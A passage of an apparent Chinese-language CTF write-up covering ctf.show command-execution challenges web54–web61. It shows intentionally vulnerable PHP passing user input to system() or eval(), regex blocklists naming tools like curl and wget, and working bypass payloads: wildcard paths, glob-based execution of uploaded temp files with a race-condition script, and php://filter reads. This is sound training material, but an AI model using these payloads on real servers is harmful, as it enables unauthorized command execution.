</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题过滤了很多命令,题目通过*使得只要是传入的内容出现如cat三个字符即可被匹配到，无法使用之前的字符拼接方法绕过</p>
<p>这题没过率通配符?</p>
<p>解一</p>
<pre tabindex="0"><code>/bin/?at${IFS}f???????
</code></pre><p>cat命令所在的路径是在/bin/目录下，所以这里相当于直接调用了cat文件执行命令，这里的cat可以看作命令，也是一个文件，所以通配符可以用在这上面（一开始还傻傻的换成uniq看能不能用hhh）。</p>
<p>bin下的命令：<a href="https://www.cnblogs.com/cuiqi1314/articles/7339776.html">Linux /bin 目录下命令简要说明 - 崔旗 - 博客园</a></p>
<p>同理bin目录下还存在more，所以这里的cat我们换成more也可以读取flag。
解二</p>
<pre tabindex="0"><code>vi${IFS}fla?.php 
or
c=uniq${IFS}f???.php //倒序的
or
grep${IFS}%27fla%27${IFS}f???????%0a
</code></pre><h4 id="web55">web55<a hidden class="anchor" aria-hidden="true" href="#web55">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 20:03:51
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了</p>
<pre tabindex="0"><code>\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/
</code></pre><p>这题涉及到一个知识点</p>
<p>也就是<strong>无字母数字的命令执行</strong></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108557067">https://blog.csdn.net/qq_46091464/article/details/108557067</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌</a></p>
<p>思路</p>
<blockquote>
<ol>
<li>shell下可以利用<code>.</code>来执行任意脚本</li>
<li>Linux文件名支持用glob通配符代替</li>
</ol></blockquote>
<p>我们可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过<code>.(点)</code>去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在<code>/tmp/php??????</code>一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）</p>
<blockquote>
<pre tabindex="0"><code>注意：通过`.`去执行sh命令不需要有执行权限
</code></pre></blockquote>
<p>1.构造post数据包</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>POST数据包POC<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://f3a86e62-7402-4d1d-b950-0d6da4aa4eab.challenge.ctf.show/&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c">&lt;!--链接是当前打开的题目链接--&gt;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;</span>文件名：<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;提交&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>在上传的文件里面写入sh指令</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="cp"></span>ls
</span></span></code></pre></div><p>2.抓包</p>
<p><img alt="image-20241127181502002" loading="lazy" src="assets/image-20241127181502002.png"></p>
<p>3.构造执行sh命令的poc</p>
<p>详细解释poc的构造：</p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob</a></p>
<p>我们这里可以理解为我们这道题里面的干扰文件名都是由小写字母组成的，所有文件名都是小写，只有PHP生成的临时文件包含大写字母，那我们就可以构造出如下的poc</p>
<pre tabindex="0"><code>?c=.+/???/????????[@-[]
</code></pre><p>注：后面的<code>[@-[]</code>是linux下面的匹配符，是进行匹配的大写字母。
<img alt="在这里插入图片描述" loading="lazy" src="https://i-blog.csdnimg.cn/blog_migrate/fcbf237f846ebf0be65c4c9aceaf3714.png#pic_center"></p>
<p>我们就来吧</p>
<p><img alt="image-20241127233056280" loading="lazy" src="assets/image-20241127233056280.png"></p>
<p>修改一下指令内容即可得到flag</p>
<p><img alt="image-20241127233144783" loading="lazy" src="assets/image-20241127233144783.png"></p>
<h4 id="web56">web56<a hidden class="anchor" aria-hidden="true" href="#web56">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|[0-9]|</span><span class="se">\\</span><span class="s2">$|\(|\{|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>;|[a-z]|[0-9]|\$|(|{|'|&quot;|`|%|\x09|\x26|&gt;|&lt;</p></blockquote>
<p>这题相比上一题多过滤了一个数字，不影响我们上题的解题方法</p>
<p>这里不再赘述</p>
<p>放个大佬的脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">	<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]&#34;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;feng.txt&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cat flag.php&#39;</span><span class="p">)})</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl">	<span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">8</span><span class="cl">		<span class="k">break</span>
</span></span></code></pre></div><h4 id="web57">web57<a hidden class="anchor" aria-hidden="true" href="#web57">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-08 01:02:56
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">// 还能炫的动吗？
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">//flag in 36.php
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|[0-9]|\`|\|\#|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|</span><span class="se">\x0a</span><span class="s2">|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cat &#34;</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤条件增加</p>
<blockquote>
<p>;|[a-z]|[0-9]|`||#|'|&quot;|`|%|\x09|\x26|\x0a|&gt;|&lt;|.|,|?|*|-|=|[/</p></blockquote>
<p>这道题把<code>?</code>过滤了，但是我们可以看到</p>
<pre tabindex="0"><code>system(&#34;cat &#34;.$c.&#34;.php&#34;);
</code></pre><p>这题会将我们传入的get参数进行拼接后再执行</p>
<p>题目里有个暗示</p>
<pre tabindex="0"><code>//flag in 36.php
</code></pre><p>也就是说我们要用符号构造出36</p>
<p>我们可以利用linux的$(())构造出36</p>
<p>在linux里面$(())=0，$((~ $(()) ))=-1</p>
<p>其中~符号表示取反，这里0的取反等于－1</p>
<p>也就是我们先将36个-1加起来再取反得到我们需要的36</p>
<p>payload:</p>
<pre tabindex="0"><code>c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
</code></pre><p><img alt="image-20241128205205756" loading="lazy" src="assets/image-20241128205205756.png"></p>
<p>从而得到flag</p>
<h4 id="web58">web58<a hidden class="anchor" aria-hidden="true" href="#web58">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>payload:</p>
<pre tabindex="0"><code>c=highlight_file(&#34;flag.php&#34;);
c=include($_POST[&#39;w&#39;]);&amp;w=php://filter/convert.base64-encode/resource=flag.php //文件包含，得到的回显需要进行base64解码
c=show_source(&#39;flag.php&#39;);
</code></pre><h4 id="web59">web59<a hidden class="anchor" aria-hidden="true" href="#web59">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>解法与上题一致，不再赘述</p>
<p>（没搞懂两题有什么区别）</p>
<h4 id="web60">web60<a hidden class="anchor" aria-hidden="true" href="#web60">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>解法依旧与web58一致</p>
<p>可能我太菜了看不出有什么区别</p>
<h4 id="web61">web61<a hidden class="anchor" aria-hidden="true" href="#web61">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
